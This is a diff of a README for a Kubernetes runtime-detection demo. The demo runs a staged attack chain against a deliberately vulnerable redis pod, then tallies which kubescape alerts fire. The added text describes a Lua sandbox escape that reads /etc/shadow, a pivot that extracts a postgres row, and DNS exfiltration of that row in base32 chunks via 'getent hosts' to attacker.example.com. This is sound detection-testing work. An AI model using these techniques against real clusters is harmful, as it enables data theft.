@@ -94,18 +94,22 @@ cd bob
 ./scripts/local-ci-chain.sh --use-published
 ```
 
-This:
+This is the **CUSTOMER FLOW**:
 1. Pulls `ghcr.io/k8sstormcenter/chain-frontend:latest` + `chain-backend:latest`
    anonymously (public images, no docker, no auth, no credentials).
-2. Deploys 4 components (frontend, backend, redis-vulnerable, postgres:16)
-   into a new `chain` namespace.
-3. Generates benign baseline HTTP traffic so kubescape learns 4 sbobs
-   (ApplicationProfile + NetworkNeighborhood per pod).
-4. Waits for each AP to be both `kubescape.io/status: completed` AND
-   non-empty (auto-retries if kubescape seals an empty profile).
-5. Snapshots alertmanager, runs the 4-stage chain attack via `bobctl
+2. Creates the `chain` namespace and applies the four pre-shipped
+   user-supplied sbobs from `example/chain/sbobs/` (`ap-chain-*.yaml` +
+   `nn-chain-*.yaml`) — these carry `kubescape.io/managed-by: User`
+   so node-agent treats them as authoritative.
+3. Deploys 4 components (frontend, backend, redis-vulnerable, postgres:16)
+   into the `chain` namespace. Each pod template has matching
+   `kubescape.io/user-defined-profile: chain-<role>` and
+   `kubescape.io/user-defined-network: chain-<role>` labels, so
+   node-agent picks up the supplied AP+NN by name and **skips
+   learning entirely**.
+4. Snapshots alertmanager, runs the 4-stage chain attack via `bobctl
    attack`, snapshots alertmanager again.
-6. Parses `chain-attacks.yaml`'s expected detections, matches them
+5. Parses `chain-attacks.yaml`'s expected detections, matches them
    against active alerts, prints a coverage table.
 
 Expected output (last ~15 lines):
@@ -124,6 +128,56 @@ Coverage: 4 / 7 expected detections matched
 
 The 3 BLIND rows are intentional — see `example/chain/README.md`
 section "How to unblind".
+
+### Extended chain (opt-in: real pg-wire + DNS exfil)
+
+```bash
+./scripts/local-ci-chain.sh --use-published --extended
+```
+
+`--extended` runs two additional stages after the basic chain:
+
+- **s5-pivot-pg-protocol-extract-row** — perl one-liner inside the
+  redis Lua sandbox speaks real pg-wire (V3 StartupMessage + Query +
+  parse DataRow) and extracts one row from chain-postgres back to the
+  redis pod. The HTTP response carries the extracted bytes through the
+  frontend (`PG_ROW=<actual-postgres-row>`). Stage 3's SSLRequest-only
+  predecessor proved connectivity; s5 proves data moves cross-pod.
+
+- **s6-dns-exfil-of-stolen-row** — same primitive, different sink.
+  After extracting the row, perl base32-encodes it and slices into
+  30-char DNS labels. One `getent hosts <chunk>.attacker.example.com`
+  per chunk. With `networkEventsStreaming: enable` each lookup
+  becomes an R0005 alert with the encoded label visible in
+  `alert.labels.address` — operators see the leaked bytes in the
+  SIEM, not just an anomaly count.
+
+Expected output (extended; 6/12 = same DETECTED set + 2 new R0001
+perl detections from s5/s6, all 4 new BLINDs map to the same operator
+knobs):
+
+```
+SCENARIO                              RULE    CONTAINER  COMM    STATUS
+s2-escape-sandbox-read-shadow         R0001   redis      cat     DETECTED
+s2-escape-sandbox-read-shadow         R0010   redis              DETECTED
+s3-pivot-redis-as-pg-client           R0001   redis      bash    DETECTED
+s3-pivot-redis-as-pg-client           R0011   redis              BLIND
+s4-exfil-to-internet                  R0001   redis      perl    DETECTED
+s4-exfil-to-internet                  R0005   redis              BLIND
+s4-exfil-to-internet                  R0011   redis              BLIND
+s5-pivot-pg-protocol-extract-row      R0001   redis      perl    DETECTED
+s5-pivot-pg-protocol-extract-row      R0011   redis              BLIND
+s6-dns-exfil-of-stolen-row            R0001   redis      perl    DETECTED
+s6-dns-exfil-of-stolen-row            R0005   redis              BLIND
+s6-dns-exfil-of-stolen-row            R0011   redis              BLIND
+
+Coverage: 6 / 12 expected detections matched
+```
+
+Requires `chain.yaml` to set `POSTGRES_HOST_AUTH_METHOD=trust` on
+chain-postgres (already configured in this branch). The basic chain
+still works either way — Stage 3 only sends SSLRequest bytes and
+reads the `N` (no SSL) reply, which doesn't depend on auth mode.
 
 ### Pinning to a specific build
 
@@ -148,8 +202,12 @@ Only needed if you're iterating on the Go services or chain manifests:
 
 ```bash
 ./scripts/local-ci-chain.sh                    # full pipeline, builds + ttl.sh-pushes
-./scripts/local-ci-chain.sh --setup-only       # just deploy + learn
+./scripts/local-ci-chain.sh --setup-only       # just deploy + apply sbobs, stop
 ./scripts/local-ci-chain.sh --attack-only      # re-run chain against existing deploy
+./scripts/local-ci-chain.sh --extended         # also run s5 (pg-wire) + s6 (DNS exfil)
+./scripts/local-ci-chain.sh --attack-only --extended  # re-run incl. extended stages
+./scripts/local-ci-chain.sh --learn-sbobs      # VENDOR FLOW: skip sbobs/, let kubescape learn
+./scripts/local-ci-chain.sh --isolate=chain-redis  # VERIFICATION: only one pod uses sbobs
 ```
 
 The local path builds chain-{frontend,backend} from
@@ -164,6 +222,100 @@ don't need to do anything; it just works.
 
 ---
 
+## Step 4b — User-supplied AP/NN contract (the "sbobs" wire format)
+
+The chain demo ships **four pairs** of pre-baked AP+NN files under
+`example/chain/sbobs/` — one pair per pod. They're the canonical
+example of node-agent's *user-supplied profile* contract. Any agent
+extending this demo (or shipping its own sbobs for another app) must
+respect every clause below or node-agent will silently ignore the
+profile and fall back to learning.
+
+### Required AP/NN annotations + labels
+
+```yaml
+apiVersion: spdx.softwarecomposition.kubescape.io/v1beta1
+kind: ApplicationProfile        # or NetworkNeighborhood
+metadata:
+  name: chain-<role>            # MUST be stable; pod labels reference this by name
+  namespace: chain
+  annotations:
+    kubescape.io/completion: complete
+    kubescape.io/status: completed
+    kubescape.io/managed-by: User   # ← gate. node-agent's isUserManagedProfile()
+                                    #   / isUserManagedNN() check this exact value.
+  labels:
+    kubescape.io/workload-api-group: apps
+    kubescape.io/workload-api-version: v1
+    kubescape.io/workload-kind: Deployment
+    kubescape.io/workload-name: chain-<role>   # MUST match the Deployment name
+    kubescape.io/workload-namespace: chain
+spec:
+  # ... (paths, execs, opens, endpoints, ingress/egress) ...
+```
+
+### Required pod-side labels (in chain.yaml)
+
+Each Deployment's `spec.template.metadata.labels` MUST carry:
+
+```yaml
+kubescape.io/user-defined-profile: chain-<role>
+kubescape.io/user-defined-network:  chain-<role>
+```
+
+The value of both is the AP/NN resource name, NOT the Deployment name
+(they happen to match in this demo for clarity). node-agent's
+`shared_container_data.go` matches pod ↔ profile by these two labels.
+
+### Source references in node-agent (for anyone extending this)
+
+```
+pkg/objectcache/applicationprofilecache/applicationprofilecache.go
+                isUserManagedProfile()                 — managed-by gate
+pkg/objectcache/networkneighborhoodcache/networkneighborhoodcache.go
+                isUserManagedNN()                      — same for NN
+pkg/objectcache/shared_container_data.go               — pod-label match
+tests/resources/known-network-neighborhood.yaml        — canonical shape
+```
+
+### Transforms applied when promoting a learned sbob → user-supplied
+
+When the vendor regenerates an sbob (via `--learn-sbobs`, then
+`kubectl get -o yaml` + hand-edit), apply this one-off normaliser
+before committing to `example/chain/sbobs/`. The tuner will eventually
+automate this, but today it's manual:
+
+| Drop | Add | Rename | Wildcard / collapse |
+|---|---|---|---|
+| `creationTimestamp`, `resourceVersion`, `uid` | `kubescape.io/managed-by: User` | `replicaset-chain-<role>-<hash>` → `chain-<role>` | `/usr/lib/postgresql/16/bin/postgres` → `…/⋯/bin/postgres` (wildcard the postgres major version) |
+| `kubescape.io/sync-checksum`, `kubescape.io/resource-size` | — | — | `/dev/shm/PostgreSQL.<rand>` → `/dev/shm/⋯` (and similar dynamic suffixes — see `storage/pkg/registry/file/dynamicpathdetector`) |
+| `wlid`, `instance-id`, `instance-template-hash` | — | — | `/pg_wal/<24-hex>` → `/pg_wal/⋯` |
+| `learning-period`, `workload-resource-version` | — | — | `/etc/redis/..<date-secs>/redis.conf` → `/etc/redis/⋯/redis.conf` |
+| Literal-IP HTTP `Host:` headers (e.g. `Host: 10.42.0.198:8080`) — kubescape uses `strings.Contains()` on Host, so a learned pod IP is cluster-specific noise that false-positives on the customer's cluster | — | — | — |
+
+`imageTag` is updated from `ttl.sh/<uuid>` to `ghcr.io/k8sstormcenter`
+(the CI's stable registry); `imageID` is reset to a zero-digest
+placeholder — node-agent recomputes it on first pod-image-pull at
+the customer's cluster.
+
+### Three flows, one set of sbobs
+
+| Flag | Sbob policy | Use case |
+|---|---|---|
+| (default) | All 4 sbobs applied; no learning | Customer demo |
+| `--learn-sbobs` | No sbobs; node-agent learns from benign traffic | Vendor regenerating sbobs |
+| `--isolate=<pod>` | Only `<pod>` uses its sbob; the other 3 learn | Per-pod sbob verification |
+
+`--isolate=<pod>` is the verification harness: it proves each pod's
+AP+NN is individually well-formed without coupling the result to the
+other three. Run once per pod (`chain-redis`, `chain-postgres`,
+`chain-backend`, `chain-frontend`). All four runs should still
+produce **Coverage: 4 / 7** because the chain attack always hits the
+redis pod; what changes per run is *which* sbobs are exercised in
+their user-supplied form vs in their learned form.
+
+---
+
 ## Step 5 — Verify each piece independently (when things look off)
 
 ### a) Did all 4 pods come up?
@@ -173,13 +325,30 @@ kubectl get pods -n chain
 # image (ghcr.io/k8sstormcenter/redis-vulnerable:7.2.10).
 ```
 
-### b) Are all 4 sbobs sealed and non-empty?
+### b) Are all 4 sbobs in place?
+
+For the **CUSTOMER FLOW** (default — no learning) the four AP/NN
+resources are applied from `example/chain/sbobs/` and have short
+stable names (`chain-postgres`, `chain-redis`, `chain-backend`,
+`chain-frontend`) plus `kubescape.io/managed-by: User`:
+
+```bash
+kubectl get applicationprofile -n chain -o json | \
+  jq -r '.items[] | select(.metadata.annotations["kubescape.io/managed-by"] == "User") |
+    "\(.metadata.name)  managed-by=User  execs=\(.spec.containers[0].execs|length)"'
+# Expect 4 lines: chain-{postgres,redis,backend,frontend} each with execs>0.
+```
+
+For the **VENDOR FLOW** (`--learn-sbobs`) or under `--isolate=<pod>`
+for the OTHER three pods, kubescape learns and the CR is named
+`replicaset-chain-<role>-<hash>` with `kubescape.io/status: completed`
+and (ideally) `execs > 0`:
+
 ```bash
 kubectl get applicationprofile -n chain -o json | \
   jq -r '.items[] | select(.metadata.name | startswith("replicaset-chain-")) |
     "\(.metadata.name)  status=\(.metadata.annotations["kubescape.io/status"])  execs=\(.spec.containers[0].execs|length)"'
-# Each app should show status=completed and execs>0.
-# (the script's wait loop enforces this — but verify if you ran phases manually)
+# (the script's wait loop enforces completed+non-empty)
 ```
 
 ### c) Does the sandbox escape actually work? (manual probe)
@@ -224,7 +393,8 @@ sudo /usr/local/bin/k3s-uninstall.sh
 | Symptom | Likely cause | Fix |
 |---|---|---|
 | `Coverage: 0 / 7 matched` or all BLIND | alertmanager hasn't received events yet | re-run `--attack-only` after 30s |
-| `Coverage: 1 / 7 matched` (only R0010 fires) | redis AP sealed empty (kubescape race) | the script's retry loop should handle it; if it didn't, `kubectl delete applicationprofile -n chain -l app=chain-redis` + `kubectl rollout restart deployment/chain-redis -n chain` + re-run `--setup-only` |
+| `Coverage: 1 / 7 matched` (only R0010 fires) | redis AP sealed empty (kubescape race in `--learn-sbobs` / `--isolate=<other>` mode) OR the user-supplied redis sbob's execs list got wider than `/usr/local/bin/redis-server` | for the learn-path race, the script's retry loop should handle it; if it didn't, `kubectl delete applicationprofile -n chain -l app=chain-redis` + `kubectl rollout restart deployment/chain-redis -n chain` + re-run `--setup-only`. For the user-supplied path, `kubectl get applicationprofile chain-redis -n chain -o yaml` and confirm `spec.containers[0].execs` lists ONLY `redis-server` |
+| Profile has `kubescape.io/managed-by: User` but node-agent still seems to learn | pod labels `kubescape.io/user-defined-{profile,network}: chain-<role>` were stripped / misspelled OR the AP/NN was applied AFTER the pod started | re-apply sbobs, then `kubectl rollout restart deployment/chain-<role> -n chain` — node-agent picks up user-supplied profiles only at pod start |
 | `sandbox_blocked` in step 5(c) | wrong redis image | verify `chain.yaml` references `ghcr.io/k8sstormcenter/redis-vulnerable:7.2.10`, not vanilla `redis:7.2` |
 | `frontend never became ready` | rolling-update race in the script | `kubectl wait --for=condition=ready pod -l app=chain-frontend -n chain --timeout=120s` manually, then re-run `--attack-only` |
 | `kubescape ns (honey) missing` | step 2 not done | run `./scripts/local-ci.sh --setup-only --app webapp` |
